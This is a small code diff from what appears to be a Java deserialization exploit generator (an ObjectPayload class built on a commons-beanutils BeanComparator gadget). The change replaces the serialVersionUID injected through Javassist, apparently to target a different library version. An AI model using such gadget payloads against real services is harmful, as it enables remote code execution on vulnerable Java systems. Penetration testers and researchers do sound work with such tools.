@@ -36,7 +36,10 @@ public class CommonsBeanutilsObjectToStringComparator183 implements ObjectPayloa
 			ctBeanComparator.removeField(ctSUID);
 		} catch (javassist.NotFoundException e) {
 		}
-		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
+
+//		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
+		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -2044202215314119608L;", ctBeanComparator));
+
 		final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
 		ctBeanComparator.defrost();
 		Reflections.setFieldValue(beanComparator, "comparator", new ObjectToStringComparator());
